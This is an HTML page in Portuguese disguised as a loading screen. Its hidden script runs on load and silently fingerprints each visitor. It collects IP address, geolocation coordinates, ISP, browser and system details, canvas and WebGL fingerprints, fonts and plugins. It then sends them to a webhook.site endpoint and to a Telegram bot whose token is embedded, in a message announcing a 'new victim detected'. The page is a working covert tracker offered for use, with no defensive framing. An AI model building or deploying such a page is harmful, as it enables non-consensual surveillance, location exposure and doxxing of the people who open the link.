<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Carregando...</title>
  <style>
    body { margin: 0; background: #000; }
    img { width: 100vw; height: 100vh; object-fit: cover; }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/S8kkWtc.jpeg" alt="carregando...">

  <script>
    const inicio = Date.now();
    let tentouSair = false;

    document.addEventListener("mouseout", e => {
      if (e.clientY < 0) tentouSair = true;
    });

    function getCanvasFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillText("fingerprint", 2, 2);
      return canvas.toDataURL();
    }

    function getWebGLRenderer() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch {
        return "Não suportado";
      }
    }

    function getFontList() {
      const fonts = ['Arial','Verdana','Times New Roman','Courier','Tahoma','Georgia','Comic Sans MS','Impact','Trebuchet MS','Calibri'];
      const available = [];
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");
      const testText = "abcdefghi0123456789";
      canvas.width = 1000;
      canvas.height = 100;
      context.textBaseline = "top";
      context.font = "72px monospace";
      const defaultWidth = context.measureText(testText).width;
      fonts.forEach(font => {
        context.font = `72px '${font}', monospace`;
        if (context.measureText(testText).width !== defaultWidth) {
          available.push(font);
        }
      });
      return available;
    }

    async function fingerprint() {
      const ipData = await fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .catch(() => ({}));

      const data = {
        ip: ipData.ip || "Desconhecido",
        cidade: ipData.city || "N/A",
        estado: ipData.region || "N/A",
        pais: ipData.country_name || "N/A",
        provedor: ipData.org || "N/A",
        asn: ipData.asn || "N/A",
        fuso: ipData.timezone || "N/A",
        latitude: ipData.latitude || "N/A",
        longitude: ipData.longitude || "N/A",
        idioma: navigator.language,
        sistema: navigator.platform,
        navegador: navigator.userAgent,
        resolucao: `${screen.width}x${screen.height}`,
        touch: 'ontouchstart' in window ? "Sim" : "Não",
        tempoNaPagina: `${Math.floor((Date.now() - inicio) / 1000)}s`,
        tentouSair: tentouSair ? "Sim" : "Não",
        canvasFingerprint: getCanvasFingerprint().slice(100, 140),
        webglRenderer: getWebGLRenderer(),
        fontes: getFontList(),
        plugins: Array.from(navigator.plugins).map(p => p.name)
      };

      // Enviar pro Webhook.site
      fetch("https://webhook.site/78116f6e-de2d-47cc-b5f9-04833af1e2a8", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      // Enviar pro Telegram
      fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 94845670,
          text: `
🧠 *Nova vítima detectada*

IP: ${data.ip}
Cidade/Estado: ${data.cidade} / ${data.estado}
País: ${data.pais}
Provedor: ${data.provedor}
ASN: ${data.asn}
Localização: ${data.latitude}, ${data.longitude}
Fuso horário: ${data.fuso}

Sistema: ${data.sistema}
Navegador: ${data.navegador}
Idioma: ${data.idioma}
Resolução: ${data.resolucao}
Touchscreen: ${data.touch}
Tempo na página: ${data.tempoNaPagina}
Tentou sair: ${data.tentouSair}

Canvas FP: ${data.canvasFingerprint}
WebGL: ${data.webglRenderer}
Fontes: ${data.fontes.join(", ").slice(0, 200)}...
Plugins: ${data.plugins.join(", ").slice(0, 200)}...
          `.trim()
        })
      });
    }

    fingerprint();
  </script>
</body>
</html>
